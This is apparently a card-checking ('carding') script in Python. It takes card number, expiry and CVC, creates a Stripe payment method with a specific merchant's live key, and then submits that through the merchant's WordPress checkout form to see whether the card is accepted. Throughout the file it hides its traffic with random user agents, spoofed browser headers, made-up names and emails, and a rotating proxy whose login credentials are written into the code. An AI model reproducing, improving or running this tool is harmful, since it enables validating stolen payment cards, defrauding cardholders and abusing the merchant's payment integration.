import httpx
import random
import uuid
import string
import time
from fake_useragent import UserAgent

def Tele(ccx):
    ccx = ccx.strip()
    n = ccx.split("|")[0]
    mm = ccx.split("|")[1]
    yy = ccx.split("|")[2]
    cvc = ccx.split("|")[3]
    
    if "20" in yy:
        yy = yy.split("20")[1]

    def gen_ids():
        return {
            "guid": str(uuid.uuid4()).replace("-", ""),
            "muid": str(uuid.uuid4()).replace("-", ""),
            "sid": str(uuid.uuid4()).replace("-", ""),
        }

    def random_name():
        first = random.choice(['John', 'Mike', 'Anna', 'Lucy', 'Tom', 'Shein'])
        last = random.choice(['Lee', 'Chan', 'Lian', 'Nguyen', 'Smith'])
        return f"{first} {last}"

    def random_email():
        prefix = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
        domain = random.choice(['gmail.com', 'outlook.com', 'yahoo.com'])
        return f"{prefix}@{domain}"

    def execute_requests(proxy_url):
        ids = gen_ids()
        time_on_page = str(random.randint(10000, 60000))
        name = random_name()
        email = random_email()
        
        # Generate random user agent for this session
        ua = UserAgent()
        user_agent = ua.random

        # Configure client with SSL verification disabled for proxy compatibility
        client_config = {
            'timeout': 30.0,
            'verify': False,  # Disable SSL verification
        }
        
        if proxy_url:
            client_config['proxy'] = proxy_url
            
        with httpx.Client(**client_config) as client:
            # First request to get Stripe Payment Method
            headers_1 = {
                'accept': 'application/json',
                'accept-language': 'en-US,en;q=0.5',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://js.stripe.com',
                'priority': 'u=1, i',
                'referer': 'https://js.stripe.com/',
                'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138", "Brave";v="138"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-site',
                'sec-gpc': '1',
                'user-agent': user_agent,
            }

            # Dynamic billing name from generated name
            billing_name = name.replace(' ', '+')
            data_1 = data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid={ids["guid"]}&muid={ids["muid"]}&sid={ids["sid"]}&payment_user_agent=stripe.js%2F6675c28e57%3B+stripe-js-v3%2F6675c28e57%3B+card-element&referrer=https%3A%2F%2Fwhatchimp.com&time_on_page=42750&client_attribution_metadata[client_session_id]=a71d78e3-f421-4aa6-9dbf-ef3785cd0240&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=card-element&client_attribution_metadata[merchant_integration_version]=2017&key=pk_live_51PTM4FI7pZ6Wi2HhEbbqD61xvhZg16RSYy1aR8Msa7Axo9OVaOWK3cxaVoufAQsMht2RcsB5Enr3ETJQx6Um0Hxt00fs9tGXho'

            try:
                r1 = client.post('https://api.stripe.com/v1/payment_methods', headers=headers_1, data=data_1)
                pm = r1.json()['id']
            except Exception as e:
                raise Exception(f"Could not get payment method: {str(e)}")

            headers = {
    'authority': 'whatchimp.com',
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'origin': 'https://whatchimp.com',
    'referer': 'https://whatchimp.com/secure-checkout-free-trial/',
    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': user_agent,
    'x-requested-with': 'XMLHttpRequest',
}

            params = {
    't': '1756667374567',
}

            data = {
    'data': f'item_8__fluent_sf=&__fluent_form_embded_post_id=23415&_fluentform_8_fluentformnonce=85eb203656&_wp_http_referer=%2Fsecure-checkout-free-trial%2F&names%5Bfirst_name%5D=Htet&names%5Blast_name%5D=Myat&email={email}&phone_number=%2B61885232299&company=Kami&tax_id=92710282&payment_input=0&payment_method=stripe&terms-n-condition=on&__stripe_payment_method_id={pm}',
    'action': 'fluentform_submit',
    'form_id': '8',
}


            try:
                r2 = client.post('https://whatchimp.com/wp-admin/admin-ajax.php', 
                               headers=headers, data=data)
                return r2.json()
            except Exception as e:
                raise Exception(f"Request failed: {str(e)}")

    # Proxy configuration with fallback
    def try_with_proxy_fallback():
        proxy_options = [
            "http://looukemg-rotate:sp641d9t9drq@p.webshare.io:80",
            None  # No proxy fallback
        ]
        
        for proxy_url in proxy_options:
            try:
                return execute_requests(proxy_url)
            except Exception as e:
                if proxy_url is None:  # Last option failed
                    return {"error": f"All connection methods failed: {str(e)}"}
                continue

    # Try with proxy, fallback to direct connection
    return try_with_proxy_fallback()

# Test function
if __name__ == "__main__":
    result = Tele("4242424242424242|12|25|123")
    print(result)
